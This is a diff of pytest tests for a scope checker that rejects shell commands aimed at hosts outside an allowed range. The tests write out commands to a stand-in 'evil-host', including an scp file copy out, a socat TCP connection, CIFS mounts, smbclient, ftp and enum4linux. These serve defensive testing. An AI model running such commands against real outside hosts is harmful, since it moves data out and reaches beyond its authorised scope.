@@ -262,6 +262,26 @@ class TestAssertCommandInScope:
         with pytest.raises(PermissionDeniedError, match="evil-host"):
             assert_command_in_scope("smbclient //evil-host/share", scope_env=scope)
         with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope(r"smbclient \\evil-host\share", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
             assert_command_in_scope("smbclient -L evil-host", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope(
+                "mount -t cifs //evil-host/share /mnt", scope_env=scope
+            )
         assert_command_in_scope("smbclient //example.com/share", scope_env=scope)
         assert_command_in_scope("smbclient //10.1.2.3/share", scope_env=scope)
+        assert_command_in_scope("mount -t cifs //10.1.2.3/share /mnt", scope_env=scope)
+
+    def test_scp_socat_ftp_host_tools_under_scope(self) -> None:
+        scope = "10.0.0.0/8,example.com"
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope("scp file evil-host:/tmp/", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope("socat TCP:evil-host:80 -", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope("ftp evil-host", scope_env=scope)
+        with pytest.raises(PermissionDeniedError, match="evil-host"):
+            assert_command_in_scope("enum4linux evil-host", scope_env=scope)
+        assert_command_in_scope("scp file 10.1.2.3:/tmp/", scope_env=scope)
+        assert_command_in_scope("socat TCP:10.1.2.3:80 -", scope_env=scope)
